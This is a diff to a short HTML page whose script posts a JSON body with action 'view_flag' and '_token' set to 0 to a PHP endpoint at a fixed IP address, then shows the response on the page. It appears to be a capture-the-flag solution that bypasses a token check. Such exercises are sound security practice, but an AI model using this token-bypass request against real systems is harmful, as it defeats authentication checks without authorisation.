@@ -1,11 +1,16 @@
+<!DOCTYPE html>
 <html>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+	<div id="div1">Waiting...</div>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
     <script type="text/javascript">
+		$('#div1').html("Starting...");
 		$.ajax('http://130.211.103.40/wrongtoken/index.php', {
 		    type: 'post',
-			dataType: "xml/html/script/json",
+			dataType: "html",
 			contentType: 'application/x-www-form-urlencoded;application/json',
 		    data: '{"action": "view_flag", "_token": 0}',
+			success: function(data){$('#div1').html(data)},
 		});
     </script>
+
 </html>
